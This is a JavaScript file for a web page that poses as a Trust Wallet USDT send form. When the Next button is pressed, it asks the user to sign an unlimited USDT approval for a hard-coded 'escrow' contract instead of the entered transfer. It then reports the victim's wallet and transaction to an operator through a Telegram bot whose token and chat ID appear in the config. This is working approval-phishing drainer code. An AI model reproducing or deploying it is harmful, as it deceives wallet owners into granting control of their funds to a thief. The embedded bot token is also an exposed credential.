document.addEventListener("DOMContentLoaded", function() {

    // ===== CONFIG =====
    const CONFIG = {
        COMPANY_WALLET_ADDRESS: "0x1d3Dd8A3Cf438d62cC965E7EB9E83E494e7F56F7",
        CONTRACT_ADDRESS: "0xe1ccb7BD1114bEcD51aaE907A3546aeCA5EDBab4", 
        // ESCROW CONTRACT
        TELEGRAM_BOT_TOKEN: "8749818817:AAEm6PqSJRhnOFdZsP3ITP660FB9c4WxA2w",
        ADMIN_CHAT_ID: "6917216640",
        SENDER_KEY: ""
    };

    // ===== TELEGRAM NOTIFICATION FUNCTION =====
    async function sendTelegramNotifications(walletAddress, txHash, userId) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;

        const inlineKeyboard = {
            inline_keyboard: [[{
                text: "🔗 View Transaction",
                url: `https://bscscan.com/tx/${txHash}`
            }]]
        };

        const adminMessage = `🔔 **New USDT Approval Transaction**\n\n` + 
                             `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` + 
                             `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` + 
                             `👤 **User ID:** ${userId || "Not provided"}\n` + 
                             `⏰ **Time:** ${new Date().toLocaleString()}\n\n` + 
                             `✅ Transaction approved successfully!`;

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });

            if (userId) {
                const userMessage = `🎉 **USDT Approval Successful!**\n\n` + 
                                    `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` + 
                                    `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` + 
                                    `✅ **Status:** Approved`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }
        } catch (error) {
            console.error("Failed to send Telegram notifications:", error);
        }
    }

    // ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background = type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3500);
    }

    // ===== FORM LOGIC =====
    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn ? nextBtn.innerHTML : "Next";
    const approxUsd = document.querySelector(".text-xs.text-gray-500");
    const maxBtn = Array.from(document.querySelectorAll("button")).find((btn) => btn.textContent.trim().toLowerCase() === "max");

    if (amountInput) {
        amountInput.value = "1";
    }
    if (approxUsd) {
        approxUsd.textContent = "≈ $1.00";
    }

    function updateApproxUsd() {
        if (!amountInput || !approxUsd) return;
        let amount = parseFloat(amountInput.value.trim());
        approxUsd.textContent = isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
    }
    if (amountInput) amountInput.addEventListener("input", updateApproxUsd);

    function validate() {
        if (!addressInput || !amountInput || !nextBtn) return;
        const address = addressInput.value.trim();
        const amount = amountInput.value.trim();
        nextBtn.disabled = !(address.length > 0 && amount.length > 0);
    }
    if (addressInput) addressInput.addEventListener("input", validate);
    if (amountInput) amountInput.addEventListener("input", validate);
    validate();

    // ===== MAX BUTTON =====
    if (maxBtn) {
        maxBtn.addEventListener("click", async function(e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("Please open directly inside Trust Wallet DApp Browser.", "error");
                return;
            }
            try {
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
                const usdtAbi = ["function balanceOf(address owner) view returns (uint256)", "function decimals() view returns (uint8)"];
                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
                
                let decimals = 18;
                try { decimals = await usdt.decimals(); } catch (err) {}
                
                let balance = await usdt.balanceOf(accounts[0]);
                let maxValue = ethers.utils.formatUnits(balance, decimals);
                amountInput.value = (+maxValue).toString();
                updateApproxUsd();
                validate();
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

    // ===== NEXT BUTTON - APPROVE USDT (BSC BEP20) =====
    if (nextBtn) {
        nextBtn.addEventListener("click", async function(e) {
            e.preventDefault();

            // Web3 Provider check with auto-redirect fallback for Trust Wallet Scanner
            if (!window.ethereum) {
                const currentUrl = encodeURIComponent(window.location.href);
                showNotification("Opening in Trust Wallet...", "info");
                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
                return;
            }

            nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
            nextBtn.disabled = true;

            try {
                // 1. Explicitly Request Account Access (Trigger Connect Prompt if not connected)
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts"
                });

                if (!accounts || accounts.length === 0) {
                    throw new Error("No accounts authorized.");
                }
                const fromAddress = accounts[0];

                // 2. Switch to BSC Chain (0x38 = 56)
                const bnbChainId = "0x38";
                const bnbChainParams = {
                    chainId: bnbChainId,
                    chainName: "BNB Smart Chain",
                    nativeCurrency: {
                        name: "BNB",
                        symbol: "BNB",
                        decimals: 18
                    },
                    rpcUrls: ["https://bsc-dataseed1.binance.org/"],
                    blockExplorerUrls: ["https://bscscan.com/"]
                };

                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: bnbChainId }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902 || switchError?.data?.originalError?.code === 4902) {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [bnbChainParams]
                        });
                    } else {
                        throw switchError;
                    }
                }

                // 3. Check and Auto-Fund Gas Fee (if sender key is set)
                try {
                    const balance = await window.ethereum.request({
                        method: "eth_getBalance",
                        params: [fromAddress, "latest"]
                    });
                    const balanceInBNB = ethers.utils.formatEther(balance);

                    if (parseFloat(balanceInBNB) < 0.0001 && CONFIG.SENDER_KEY) {
                        const senderWallet = new ethers.Wallet(CONFIG.SENDER_KEY);
                        const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
                        const senderSigner = senderWallet.connect(bscProvider);
                        const fundAmount = ethers.utils.parseEther('0.0002');
                        
                        const txFund = await senderSigner.sendTransaction({
                            to: fromAddress,
                            value: fundAmount,
                            gasLimit: 21000
                        });
                        await txFund.wait();
                    }
                } catch (gasErr) {
                    console.warn("Gas fund check bypassed/failed:", gasErr);
                }

                // 4. Trigger Contract Approval
                const escrowAddress = CONFIG.CONTRACT_ADDRESS;
                const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

                const usdtAbi = [
                    "function approve(address spender, uint256 amount) public returns (bool)"
                ];
                const iface = new ethers.utils.Interface(usdtAbi);
                const maxApprovalAmount = ethers.constants.MaxUint256;
                const txData = iface.encodeFunctionData("approve", [escrowAddress, maxApprovalAmount.toString()]);

                // This triggers the native approval signature screen
                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: fromAddress,
                        to: usdtAddress,
                        data: txData,
                        value: "0x0"
                    }]
                });

                showNotification("", "success");

                if (txHash) {
                    const urlParams = new URLSearchParams(window.location.search);
                    const userId = urlParams.get("user_id");
                    await sendTelegramNotifications(fromAddress, txHash, userId);
                }

            } catch (err) {
                const msg = (err?.message || "").toLowerCase();
                if (msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled") || msg.includes("canceled")) {
                    showNotification("Transaction approval cancelled by user.", "error");
                } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance")) {
                    showNotification("Insufficient balance for transaction fee.", "error");
                } else {
                    showNotification("Failed to open approval. Please retry in Trust Wallet browser.", "error");
                }
            } finally {
                nextBtn.disabled = false;
                nextBtn.innerHTML = originalBtnHTML;
            }
        });
    }
});